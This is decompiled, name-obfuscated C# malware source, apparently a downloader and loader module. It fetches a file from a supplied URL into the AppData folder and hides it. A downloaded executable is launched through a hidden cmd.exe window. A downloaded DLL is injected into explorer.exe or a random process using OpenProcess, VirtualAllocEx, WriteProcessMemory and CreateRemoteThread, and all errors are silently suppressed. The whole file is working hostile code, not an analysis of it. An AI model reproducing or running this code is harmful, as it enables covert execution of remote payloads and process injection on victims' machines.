using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace ns34
{
	// Token: 0x02000035 RID: 53
	internal class Class20
	{
		// Token: 0x060001D2 RID: 466 RVA: 0x0000E950 File Offset: 0x0000CB50
		public static void smethod_0(string string_0, string string_1)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (string_0 != "")
			{
				if (string_1.EndsWith(".exe"))
				{
					try
					{
						if (File.Exists(folderPath + "\\" + string_1))
						{
							try
							{
								File.Delete(folderPath + "\\" + string_1);
							}
							catch
							{
							}
						}
						using (WebClient webClient = new WebClient())
						{
							webClient.DownloadFile(string_0, folderPath + "\\" + string_1);
						}
						File.SetAttributes(folderPath + "\\" + string_1, FileAttributes.Hidden);
						string str = folderPath + "\\" + string_1;
						Process.Start(new ProcessStartInfo
						{
							UseShellExecute = true,
							WorkingDirectory = "C:\\Windows\\System32",
							FileName = "C:\\Windows\\System32\\cmd.exe",
							Arguments = "/c " + str,
							WindowStyle = ProcessWindowStyle.Hidden
						});
						return;
					}
					catch
					{
						return;
					}
				}
				if (string_1.EndsWith(".dll"))
				{
					if (File.Exists(folderPath + "\\" + string_1))
					{
						try
						{
							File.Delete(folderPath + "\\" + string_1);
						}
						catch
						{
						}
					}
					try
					{
						using (WebClient webClient2 = new WebClient())
						{
							webClient2.DownloadFile(string_0, folderPath + "\\" + string_1);
						}
						File.SetAttributes(folderPath + "\\" + string_1, FileAttributes.Hidden);
						Class20.smethod_2(folderPath + "\\" + string_1);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x0000EB20 File Offset: 0x0000CD20
		public static int smethod_1(string string_0, Process process_0)
		{
			IntPtr intptr_ = Class20.OpenProcess(1082, false, process_0.Id);
			IntPtr procAddress = Class20.GetProcAddress(Class20.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
			IntPtr intPtr = Class20.VirtualAllocEx(intptr_, IntPtr.Zero, (uint)((string_0.Length + 1) * Marshal.SizeOf(typeof(char))), 12288U, 4U);
			UIntPtr uintPtr;
			Class20.WriteProcessMemory(intptr_, intPtr, Encoding.Default.GetBytes(string_0), (uint)((string_0.Length + 1) * Marshal.SizeOf(typeof(char))), out uintPtr);
			Class20.CreateRemoteThread(intptr_, IntPtr.Zero, 0U, procAddress, intPtr, 0U, IntPtr.Zero);
			return 0;
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x0000EBE0 File Offset: 0x0000CDE0
		public static void smethod_2(string string_0)
		{
			try
			{
				Process process_;
				if (Process.GetProcessesByName("explorer").Length != 0)
				{
					process_ = Process.GetProcessesByName("explorer")[0];
				}
				else
				{
					int maxValue = Process.GetProcesses().Length;
					int num = new Random().Next(1, maxValue);
					process_ = Process.GetProcesses()[num];
				}
				Class20.smethod_1(string_0, process_);
				Class20.bool_0 = true;
			}
			catch
			{
			}
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x00003FB6 File Offset: 0x000021B6
		public static bool smethod_3()
		{
			return Class20.bool_0;
		}

		// Token: 0x060001D6 RID: 470
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(int int_5, bool bool_3, int int_6);

		// Token: 0x060001D7 RID: 471
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string string_0);

		// Token: 0x060001D8 RID: 472
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

		// Token: 0x060001D9 RID: 473
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_3, uint uint_4, uint uint_5);

		// Token: 0x060001DA RID: 474
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_3, out UIntPtr uintptr_0);

		// Token: 0x060001DB RID: 475
		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateRemoteThread(IntPtr intptr_0, IntPtr intptr_1, uint uint_3, IntPtr intptr_2, IntPtr intptr_3, uint uint_4, IntPtr intptr_4);

		// Token: 0x060001DC RID: 476
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWow64Process([In] IntPtr intptr_0, out bool bool_3);

		// Token: 0x060001DD RID: 477 RVA: 0x0000EC58 File Offset: 0x0000CE58
		public static bool smethod_4()
		{
			if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
			{
				bool result;
				using (Process currentProcess = Process.GetCurrentProcess())
				{
					bool flag;
					if (!Class20.IsWow64Process(currentProcess.Handle, out flag))
					{
						result = false;
					}
					else
					{
						result = flag;
					}
				}
				return result;
			}
			return false;
		}

		// Token: 0x040000C0 RID: 192
		private const int int_0 = 2;

		// Token: 0x040000C1 RID: 193
		private const int int_1 = 1024;

		// Token: 0x040000C2 RID: 194
		private const int int_2 = 8;

		// Token: 0x040000C3 RID: 195
		private const int int_3 = 32;

		// Token: 0x040000C4 RID: 196
		private const int int_4 = 16;

		// Token: 0x040000C5 RID: 197
		private const uint uint_0 = 4096U;

		// Token: 0x040000C6 RID: 198
		private const uint uint_1 = 8192U;

		// Token: 0x040000C7 RID: 199
		private const uint uint_2 = 4U;

		// Token: 0x040000C8 RID: 200
		public static bool bool_0 = false;

		// Token: 0x040000C9 RID: 201
		private static readonly bool bool_1 = IntPtr.Size == 8;

		// Token: 0x040000CA RID: 202
		private static readonly bool bool_2 = Class20.bool_1 || Class20.smethod_4();
	}
}
